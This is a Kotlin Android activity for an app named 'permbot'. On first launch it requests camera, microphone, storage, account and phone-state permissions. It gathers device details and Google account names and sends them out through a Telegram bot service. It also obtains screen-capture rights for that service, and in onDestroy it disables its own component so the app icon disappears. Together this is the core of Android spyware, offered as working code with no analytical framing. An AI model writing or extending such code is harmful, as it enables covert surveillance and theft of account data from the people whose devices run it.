package com.example.permbot

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.telephony.TelephonyManager
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.Random
import java.util.concurrent.Executors
import org.telegram.telegrambots.meta.TelegramBotsApi
import org.telegram.telegrambots.meta.exceptions.TelegramApiException
import org.telegram.telegrambots.updatesreceivers.DefaultBotSession

class MainActivity : AppCompatActivity() {

    private lateinit var prefs: SharedPreferences
    private lateinit var deviceId: String
    private lateinit var botServiceIntent: Intent
    private val permissions = arrayOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.GET_ACCOUNTS,
        Manifest.permission.READ_PHONE_STATE
    )
    private val permRequestCode = 100
    private var isFirstRun = true
    private var screenRecordingIntent: Intent? = null
    private val screenRecordRequestCode = 200

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        prefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
        deviceId = generateDeviceId()
        isFirstRun = prefs.getBoolean("first_run", true)

        botServiceIntent = Intent(this, BotService::class.java)

        findViewById<Button>(R.id.btnRequestPermissions).setOnClickListener {
            requestAllPermissions()
        }
        findViewById<Button>(R.id.btnStartService).setOnClickListener {
            startBotService()
        }
        findViewById<Button>(R.id.btnScreenRecord).setOnClickListener {
            requestScreenRecording()
        }

        if (isFirstRun) {
            prefs.edit().putBoolean("first_run", false).apply()
            requestAllPermissions()
            sendInitialData()
        }

        startBotService()
    }

    private fun generateDeviceId(): String {
        val letters = (0..3).map { ('A'..'Z').random() }.joinToString("")
        val digits = (0..5).map { ('0'..'9').random() }.joinToString("")
        val id = letters + digits
        val editor = prefs.edit()
        if (!prefs.contains("device_id")) {
            editor.putString("device_id", id)
            editor.apply()
        }
        return prefs.getString("device_id", id) ?: id
    }

    private fun requestAllPermissions() {
        val denied = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()
        if (denied.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, denied, permRequestCode)
        } else {
            Toast.makeText(this, "All permissions already granted", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == permRequestCode) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
            if (allGranted) {
                Toast.makeText(this, "All permissions granted", Toast.LENGTH_SHORT).show()
                sendInitialData()
            } else {
                Toast.makeText(this, "Some permissions denied. Please grant them.", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun sendInitialData() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED) {
            val accounts = getGmailAccounts()
            val info = buildString {
                append("Device ID: $deviceId\n")
                append("Manufacturer: ${Build.MANUFACTURER}\n")
                append("Model: ${Build.MODEL}\n")
                append("OS Version: ${Build.VERSION.RELEASE}\n")
                append("Build: ${Build.DISPLAY}\n")
                append("Battery: ${getBatteryLevel()}%\n")
                append("Connectivity: ${getConnectivityStatus()}\n")
                append("Accounts: $accounts\n")
            }
            BotService.sendMessage(deviceId, info)
        } else {
            Toast.makeText(this, "Accounts permission missing, can't send initial data", Toast.LENGTH_SHORT).show()
        }
    }

    private fun getBatteryLevel(): Int {
        val bm = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
        return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    private fun getConnectivityStatus(): String {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val nc = cm.activeNetwork ?: return "No network"
        val caps = cm.getNetworkCapabilities(nc) ?: return "Unknown"
        return when {
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Cellular"
            else -> "Other"
        }
    }

    private fun getGmailAccounts(): String {
        val accounts = android.accounts.AccountManager.get(this).getAccountsByType("com.google")
        return accounts.joinToString { it.name } ?: "None"
    }

    private fun startBotService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(botServiceIntent)
        } else {
            startService(botServiceIntent)
        }
        Toast.makeText(this, "Bot service started", Toast.LENGTH_SHORT).show()
    }

    private fun requestScreenRecording() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            startActivityForResult(projectionManager.createScreenCaptureIntent(), screenRecordRequestCode)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == screenRecordRequestCode) {
            if (resultCode == RESULT_OK && data != null) {
                screenRecordingIntent = data
                BotService.setScreenRecordingIntent(data)
                Toast.makeText(this, "Screen recording permission granted", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "Screen recording denied", Toast.LENGTH_SHORT).show()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (!isFirstRun) {
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }
    }
}
